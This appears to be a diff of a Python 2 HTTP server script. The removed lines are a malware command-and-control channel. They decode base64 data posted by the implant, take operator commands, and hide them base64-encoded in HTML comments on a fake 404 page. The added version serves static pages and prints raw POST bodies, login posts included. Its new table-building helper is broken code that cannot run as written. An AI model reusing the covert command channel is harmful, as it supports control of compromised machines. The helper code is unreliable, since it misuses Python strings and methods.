@@ -1,122 +1,165 @@
 import string
 import BaseHTTPServer
-import cgi #Handles the POST request parsing issues
-from os import curdir, sep #Allows a few file directory methods and features
+from SocketServer import ThreadingMixIn
+import threading
+import cgi
+from os import curdir, sep
+import _mysql_exceptions
+import MySQLdb
+import sys
 
 server_host = 'localhost'
 server_port = 80
+global begin, end
+beg = open("index.html", "r")
+en = open("index2.html", "r")
+begin = beg.read()
+end = en.read()
+beg.close()
+en.close()
 
 class Handler(BaseHTTPServer.BaseHTTPRequestHandler):
-        def do_HEAD(p): #Handles Header requests; Not necessary as the malware has no HEAD requests
+
+        def do_HEAD(p):
+
                 p.send_response(200)
                 p.send_header("Content-type", "text/html")
                 p.end_headers()
                 
-        def do_GET(p): #Handles any GET requests by the malware
+        def do_GET(p):
+                global begin, end
 
-                if p.path.startswith("/foot.aspx?"): #Checks to see if a command request or a file request is being made
+                if p.path.startswith("/foot.aspx?"):
+
                     try:
-                        #Opens the header and footer HTML code
-                        begin = open("index.html","r")
-                        end = open("index2.html","r")
                         p.send_response(200)
                         p.send_header("Content-type", "text/html")
                         p.end_headers()
-                        p.wfile.write(begin.read()+end.read())
-                        begin.close()
-                        end.close()
-                        #requested = open("index.html","w")
-                        #requested.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
-                        #requested.close()
+                        p.wfile.write(begin+end)
                     except IOError:
-                        p.send_error(404,'File Not Found')
-                elif p.path.startswith("/bask.aspx?"): #Checks to see if a command request or a file request is being made
+                        p.send_error(404, 'File Not Found')
+
+                elif p.path.startswith("/bask.aspx?"):
+
                     try:
-                        #Opens the header and footer HTML code
-                        begin = open("index.html","r")
-                        end = open("index2.html","r")
                         p.send_response(200)
                         p.send_header("Content-type", "text/html")
                         p.end_headers()
-                        p.wfile.write(begin.read()+end.read())
-                        begin.close()
-                        end.close()
-                        #requested = open("index.html","w")
-                        #requested.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
-                        #requested.close()
+                        p.wfile.write(begin+end)
+
                     except IOError:
-                        p.send_error(404,'File Not Found')
-                elif p.path.startswith("/base.aspx?"): #Checks to see if a command request or a file request is being made
+                        p.send_error(404, 'File Not Found')
+
+                elif p.path.startswith("/base.aspx?"):
+
                     try:
-                        #Opens the header and footer HTML code
-                        begin = open("index.html","r")
-                        end = open("index2.html","r")
                         p.send_response(200)
                         p.send_header("Content-type", "text/html")
                         p.end_headers()
-                        p.wfile.write(begin.read()+end.read())
-                        begin.close()
-                        end.close()
-                        #requested = open("index.html","w")
-                        #requested.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
-                        #requested.close()
+                        p.wfile.write(begin+end)
+
                     except IOError:
-                        p.send_error(404,'File Not Found')
-                else: #Handles index requests
+                        p.send_error(404, 'File Not Found')
+
+                else:
+
                     try:
-                        #Opens the header and footer HTML code
-                        begin = open("index.html","r")
-                        end = open("index2.html","r")
                         p.send_response(200)
                         p.send_header("Content-type", "text/html")
                         p.end_headers()
-                        p.wfile.write(begin.read()+end.read())
-                        begin.close()
-                        end.close()
-                        #requested = open("index.html","w")
-                        #requested.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
-                        #requested.close()
-                        return
+                        p.wfile.write(begin+end)
+
+                    except IOError:
+                        p.send_error(404, 'File Not Found')
+
+        def do_POST(p):  # Handles POST requests
+                global begin, end
+
+
+                if p.headers.dict.has_key('content-length'):
+                    length = string.atoi(p.headers.dict["content-length"])
+                    posts = p.rfile.read(length)
+                    print posts
+
+                if p.path.startswith("/login.aspx?"):
+
+                    try:
+
+                        p.send_response(200)
+                        p.send_header("Content-type", "text/html")
+                        p.end_headers()
+                        p.wfile.write(begin+end)
+
+                    except IOError:
+                        p.send_error(404, 'File Not Found')
+
+                elif p.path.startswith("/logout.aspx?"):
+
+                    try:
+
+                        p.send_response(200)
+                        p.send_header("Content-type", "text/html")
+                        p.end_headers()
+                        p.wfile.write(begin+end)
+
+                    except IOError:
+                        p.send_error(404, 'File Not Found')
+
+                elif p.path.startswith("/base.aspx?"):
+
+                    try:
+
+                        p.send_response(200)
+                        p.send_header("Content-type", "text/html")
+                        p.end_headers()
+                        p.wfile.write(begin+end)
+
                     except IOError:
                         p.send_error(404,'File Not Found')
 
-        def do_POST(p): #Handles POST requests
-                    global counter;
-                    if counter == 1:
-                        if p.headers.dict.has_key('content-length'): # Source [1] edited slightly to work for my uses
-                            length = string.atoi(p.headers.dict["content-length"])
-                            post_data = p.rfile.read(length)
-                            dec_post = base_64code("d",post_data);
-                            if dec_post != "ERROR":
-                                print dec_post;
-                        p.send_response(200)
-                        p.end_headers()
-                        user_command = get_command(); #Pauses Get Request Handling to ask for a command
-                        enc_cmd = base_64code("e",user_command); #Encodes the command
-                        cat_cmd = "<!--"+enc_cmd+"--!>" #Creates the comment based command
-                        command_file = open("index.html","w"); # Opens the html file that holds the commands
-                        command_file.write(cat_cmd);
-                        command_file.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
-                        command_file.close();
-                        if counter == 2:
-                            counter = 0
-                    elif counter == 0 or counter == 2:
-                        p.send_response(200)
-                        p.end_headers()
-                        if p.headers.dict.has_key('content-length'): # Source [1] edited slightly to work for my uses
-                            length = string.atoi(p.headers.dict["content-length"])
-                            post_data = p.rfile.read(length)
-                            dec_post = base_64code("d",post_data);
-                            if dec_post != "ERROR":
-                                print dec_post;
+                else:
 
-server_class = BaseHTTPServer.HTTPServer
-httpd = server_class((server_host, server_port), Handler)
+                    try:
+
+                        p.send_response(200)
+                        p.send_header("Content-type", "text/html")
+                        p.end_headers()
+                        p.wfile.write(begin+end)
+
+                    except IOError:
+                        p.send_error(404, 'File Not Found')
+
+        def dtb(query):  # Data Table Build
+            build = ''
+
+            for row in query:
+
+                build += '['
+                for column in row:
+                    build = build + "'" + column + "',"
+                build[build.length()-1] = ']'
+                build += ','
+            build[build.length()-1] = ''
+
+            return build
+
+        def hndlQuery(self):  # Handles Query processing
+
+            queryArray = 0
+
+            return queryArray
+
+class ThreadedHTTPServer(ThreadingMixIn, BaseHTTPServer.HTTPServer):
+        """Handle Requests in Threads"""
+
+httpd = ThreadedHTTPServer((server_host, server_port), Handler)
 
 try:
-        print "Server up";
-        httpd.serve_forever()
+
+    print "Server up"
+    httpd.serve_forever()
         
 except KeyboardInterrupt:
         pass
+
 httpd.server_close()
